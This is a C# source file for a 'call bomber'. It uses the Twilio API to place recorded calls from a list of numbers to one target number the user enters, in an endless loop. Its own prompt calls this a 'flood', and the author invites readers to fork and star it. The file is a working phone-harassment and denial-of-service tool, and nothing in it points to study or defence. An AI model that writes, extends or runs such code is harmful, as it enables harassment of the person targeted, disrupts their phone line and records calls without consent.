/*
Justin Faler
6/23/17
Fork & star this code! 
*/
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using Twilio; /* Run 'Install-Package Twilio' in NuGet Package Manager console */
using Twilio.Rest.Api.V2010.Account;
using Twilio.Types;

namespace CallBomber
{
    class Program
    {
        public static string accountSid = "*********";
        public static string authtoken = "*********";
        public static List<string> numbers = new List<string>(new string[] { "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", "+10000000000", }); // Replace "" with phone numbers
        public static List<string> numbersInUse = new List<string>();
        public static string NumToCall = "";
        static void Main(string[] args)
        {
            Console.WriteLine(@"
            
   _____ ____  __  ______ 
  / ___// __ \/ / / / __ \
  \__ \/ / / / / / / /_/ /
 ___/ / /_/ / /_/ / ____/ 
/____/\____/\____/_/      
                      
            ");

            Console.WriteLine("Enter the target number to start flood (+1 MUST BE IN FRONT!):");
            NumToCall = Console.ReadLine();
            Console.WriteLine("Press ENTER to start the flooder, Otherwise exit the application right now...");
            
            Console.ReadLine();
            Console.Clear();
            TwilioClient.Init(accountSid, authtoken);

            var count = 1;
            
            // do while loop 
            do
            {
                Console.WriteLine("Starting Call Batch " + count.ToString() + " [" + numbers.Count + " Nums.)"); // this line needs to be fixed
                foreach (string num in numbers)
                {
                    Call(num);
                    System.Threading.Thread.Sleep(1000);
                }
                count++;
                System.Threading.Thread.Sleep(5000);
            } while (true);
        }

        // Call Function
        static void Call(string FromNumber)
        {
            try
            {
                var call = CallResource.Create(
                     new PhoneNumber(NumToCall),
                     new PhoneNumber(FromNumber),
                     record: true,
                     url: new Uri("/*A URL that returns TwiML markup*/")
               );

                Console.WriteLine(string.Format($"Started call to :" + call.To + " from: " + FromNumber));

            }
            catch (Exception Ex)
            {
                Console.WriteLine(string.Format($"Error on number {FromNumber}: {Ex.Message}"));
            }

        }
    }
}
